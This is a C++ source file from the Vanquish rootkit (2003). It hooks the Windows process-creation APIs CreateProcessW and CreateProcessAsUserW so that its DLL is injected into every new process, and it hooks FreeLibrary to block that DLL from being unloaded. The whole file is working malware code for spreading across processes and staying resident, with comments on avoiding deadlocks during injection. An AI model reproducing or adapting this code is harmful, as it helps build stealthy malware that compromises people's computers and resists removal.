/******************************************************************************\

	Vanquish DLL DllUtils - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vDllUtils.h"
#include "..\Injector.h"
#include "..\Utils.h"

#include <stdio.h>

extern HMODULE ghinstDLL;//Vanquish_dll.cpp

//time to wait for process startup before injection
const DWORD WAIT_PROCESS = INFINITE;

DECLARE_DLLUTILS

//N.B: taskmgr.exe is created with a call to CreateProcessAsUserW from winlogon.exe
//     lpApplicationName is NULL
//     lpCommandLine is "taskmgr.exe"
//     lpProcessAttributes is NULL
//     lpThreadAttributes is NULL
//     bInheritHandles is FALSE
//     dwCreationFlags is CREATE_UNICODE_ENVIRONMENT | CREATE_SUSPENDED

//N.B: explorer usually runs a program with CreateProcessW
//     dwCreationFlags is CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE

//N.B: add/remove programs usually unistalls something with a call to CreateProcessW
//     dwCreationFlags is CREATE_SEPARATE_WOW_VDM | CREATE_SUSPENDED
//*** this was the reason for deadlocking: we were WaitForInputIdle(INFINITE) on a suspended thread!

NEWAPI
BOOL
WINAPI
VCreateProcessW(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	VBEGIN

	//first do the api thing
	RESTORE_API(CreateProcessW);
	OLDCALL(CreateProcessW, 10);
	REPLACE_API(CreateProcessW);

	//then infect the new process
	if (retValue && lpProcessInformation)
	{
		if (lpProcessInformation->hProcess)
		{
			//wait for process to finish it's initalization
			if ((dwCreationFlags & CREATE_SUSPENDED) != CREATE_SUSPENDED)
				WaitForInputIdle(lpProcessInformation->hProcess, WAIT_PROCESS);

			//now is the time
			Vanquish_InjectDLLbyHandle(lpProcessInformation->hProcess);
		}
		else
			Vanquish_Dump("No hProcess for injection");
	}
	else
		Vanquish_Dump("No retValue or ProcessInfo!!!");

	VEND
	return retValue;
}

NEWAPI
BOOL
WINAPI
VCreateProcessAsUserW (
    HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	VBEGIN

	//first do the api thing
	RESTORE_API(CreateProcessAsUserW);
	OLDCALL(CreateProcessAsUserW, 11);
	REPLACE_API(CreateProcessAsUserW);

	//then infect the new process
	if (retValue && lpProcessInformation)
	{
		if (lpProcessInformation->hProcess)
		{
			//wait for process to finish it's initalization
			if ((dwCreationFlags & CREATE_SUSPENDED) != CREATE_SUSPENDED)
				WaitForInputIdle(lpProcessInformation->hProcess, WAIT_PROCESS);

			//now is the time
			Vanquish_InjectDLLbyHandle(lpProcessInformation->hProcess);
		}
		else
			Vanquish_Dump("No hProcess for injection");
	}
	else
		Vanquish_Dump("No retValue or ProcessInfo!!!");

	VEND
	return retValue;
}

NEWAPI
BOOL
WINAPI
VFreeLibrary(
    HMODULE hLibModule
    )
{
	BOOL retValue = FALSE;

	VBEGIN

	//if hLibModule is not vanquish then we can unload it...
	if (hLibModule != ghinstDLL)
	{
		RESTORE_API(FreeLibrary);
		OLDCALL(FreeLibrary, 1);
		REPLACE_API(FreeLibrary);
	}

	VEND
	return retValue;
}
